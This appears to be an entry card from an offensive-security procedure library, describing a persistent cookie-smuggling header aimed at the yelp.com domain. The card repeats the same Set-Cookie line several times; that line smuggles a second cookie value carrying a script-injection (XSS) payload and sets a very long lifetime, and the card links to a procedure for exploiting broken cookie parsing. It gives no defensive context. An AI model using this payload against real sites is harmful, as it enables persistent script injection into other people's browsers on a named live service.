---
data: >-
  Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>;
  Max-Age=99999999; Domain=.yelp.com; Path=/; Secure; SameSite=Lax
tags:
  - cookie-smuggling
type: command
executor: bash
platforms:
  - Web
id: b2862f78-1e7f-47cc-8d25-a152e2ddcaac
created_at: '2025-12-13T23:56:20.360Z'
updated_at: '2025-12-13T23:56:20.360Z'
verified: false
validated: true
submitted: true
---
# set-persistent-smuggled-cookie-response

## Command

```bash
Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Max-Age=99999999; Domain=.yelp.com; Path=/; Secure; SameSite=Lax
```

## Description

Sets persistent smuggled cookie.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `yelpmainpaastacanary` | Smuggled value with Max-Age | Yes |

## Examples

### Basic Usage

```bash
Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Max-Age=99999999; Domain=.yelp.com; Path=/; Secure; SameSite=Lax
```

## Expected Output

Persistent cookie set

## Related

- [[procedures/Exploit-Broken-Cookie-Parsing-for-Smuggling]]
